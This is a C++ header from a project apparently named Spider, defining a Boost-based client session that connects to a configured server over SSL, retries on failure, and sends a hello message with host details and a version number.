//
// Created by Blowa-XPS on 06-Oct-17.
//

#ifndef SPIDER_CLIENT_CLIENTSESSION_HPP
#define SPIDER_CLIENT_CLIENTSESSION_HPP

#include <boost/bind.hpp>
#include <utils/NonCopyable.hpp>
#include <log/Logger.hpp>
#include <Configuration.hpp>
#include <Protocol/Messages.hpp>
#include <Network/Timer.hpp>
#include <Network/SSLConnection.hpp>

namespace spi
{
    class ClientSession : utils::NonCopyable
    {
    public:
        ClientSession(net::SSLContext &ctx, net::IOManager &service, const cfg::Config &conf) :
            _ctx(ctx),
            _ioManager(service),
            _timer(_ioManager, conf.retryTime),
            _conf(conf)
        {
            if (!_ctx.usePrivateKeyFile(conf.keyFile) || !_ctx.useCertificateFile(conf.certFile)) {
                _log(logging::Error) << "SSL Context loading error" << std::endl;
                close();
            }
        }

        ~ClientSession() override = default;

        template <typename CoreCallback>
        void onConnect(CoreCallback callback)
        {
            _connectCallback = callback;
        }

        void connect()
        {
            _sslConnection.asyncConnect(_conf.address, _conf.port,
                                        boost::bind(&ClientSession::__handleConnect, this, net::ErrorPlaceholder));
        }

    private:
        void close() noexcept
        {
            _log(logging::Info) << "Disconnecting from server..." << std::endl;
            _sslConnection.rawSocket().close();
            _log(logging::Info) << "Stopping IOManager..." << std::flush;
            _ioManager.stop();
        }

        void __retryConnect(const ErrorCode &error)
        {
            if (!error) {
                connect();
            } else {
                _log(logging::Info) << error.message() << std::endl;
            }
        }

        void __rescheduleConnection(long seconds) noexcept
        {
            _timer.setExpiry(seconds);
            _timer.asyncWait(boost::bind(&ClientSession::__retryConnect, this, net::ErrorPlaceholder));
        }

        void __handleAuthentication(const ErrorCode &err)
        {
            if (!err) {
                _log(logging::Info) << "Successfully authenticated against server" << std::endl;
                _connectCallback(&_sslConnection);
            } else {
                _log(logging::Level::Warning) << "Unable to authenticate: retrying in "
                                              << _conf.retryTime << " seconds" << std::endl;
                __rescheduleConnection(_conf.retryTime);
            }
        }

        void __handleHandshake(const ErrorCode &errorCode)
        {
            if (!errorCode) {
                proto::Hello hello;
                hello.macAddress.get();
                hello.md5 = utils::MD5(cfg::filename);
                hello.port = _conf.portAcceptor;
                hello.version = 1;
                Buffer buff;
                hello.serializeTypeInfo(buff);
                hello.serialize(buff);
                _sslConnection.asyncWriteSome(buff, boost::bind(&ClientSession::__handleAuthentication,
                                                                this, net::ErrorPlaceholder));
            } else {
                _log(logging::Level::Warning) << "Unable to perform SSL handshake: retrying in "
                                              << _conf.retryTime << " seconds" << std::endl;
                __rescheduleConnection(_conf.retryTime);
            }
        }

        void __handleConnect(const ErrorCode &errorCode)
        {
            if (errorCode) {
                _log(logging::Debug) << errorCode.message() << std::endl;
                _log(logging::Warning) << "Unable to connect: retrying in "
                                       << _conf.retryTime << " seconds" << std::endl;
                __rescheduleConnection(_conf.retryTime);
            } else {
                _log(logging::Info) << "Connected to server" << std::endl;
                _sslConnection.asyncHandshake(net::SSLConnection::HandshakeType::Client,
                                              boost::bind(&ClientSession::__handleHandshake,
                                                          this, net::ErrorPlaceholder));
            }
        }

        std::function<void(net::SSLConnection *)> _connectCallback{};
        net::SSLContext &_ctx;
        net::IOManager &_ioManager;
        net::Timer _timer;
        net::SSLConnection _sslConnection{_ioManager, _ctx};
        logging::Logger _log{"server-session", logging::Level::Info};
        cfg::Config _conf;
    };
}

#endif //SPIDER_CLIENT_CLIENTSESSION_HPP
